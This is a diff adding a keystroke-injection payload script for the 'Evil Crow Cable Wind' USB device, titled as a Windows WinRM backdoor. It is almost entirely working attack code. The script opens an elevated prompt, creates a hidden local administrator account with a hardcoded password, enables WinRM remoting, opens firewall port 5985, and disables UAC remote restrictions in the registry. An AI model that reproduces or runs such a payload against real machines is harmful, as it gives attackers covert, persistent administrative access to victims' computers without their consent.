@@ -1,0 +1,62 @@
+// Title:            "Microsoft Windows" WinRM Backdoor
+//
+// Description:      
+//                   1) Adds a user account (RD_User:RD_P@ssW0rD).
+//                   2) Adds this local user to local administrator group.
+//                   3) Enables "Windows Remote Management" with default settings.
+//                   4) Adds a rule to the firewall.
+//                   5) Sets a value to "LocalAccountTokenFilterPolicy" to disable "UAC" remote restrictions.
+//                   6) Hides this user account.
+//
+// Adapted for:      Evil Crow Cable Wind
+// Target:           Microsoft Windows
+//
+// TESTED ON
+// ===============
+// Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+// Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+//
+// REQUIREMENTS
+// ===============
+// The target user must belong to the 'Administrators' group.
+
+// INITIALIZATION
+Delay 2000
+
+// STAGE 1: Open elevated command prompt
+GuiR
+Delay 3000
+Print cmd
+Delay 1000
+Press KEY_LEFT_CTRL
+Press KEY_LEFT_SHIFT
+Print ENTER
+Release
+Delay 3000
+Press KEY_LEFT
+Delay 5000
+Press KEY_ENTER
+Delay 5000
+
+// STAGE 2: Create user and add to administrators
+PrintLine NET USER RD_User RD_P@ssW0rD /ADD
+Delay 1500
+PrintLine NET LOCALGROUP Administrators RD_User /ADD
+Delay 1500
+
+// STAGE 3: Configure WinRM and Firewall
+PrintLine WINRM QUICKCONFIG
+Delay 4000
+PrintLine y
+Delay 1500
+PrintLine NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Remote Management for RD" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
+Delay 1500
+
+// STAGE 4: Registry modifications for UAC bypass and user hiding
+PrintLine REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
+Delay 1500
+PrintLine REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v RD_User /t REG_DWORD /d 0
+Delay 1500
+
+// FINISH: Exit command prompt
+PrintLine EXIT
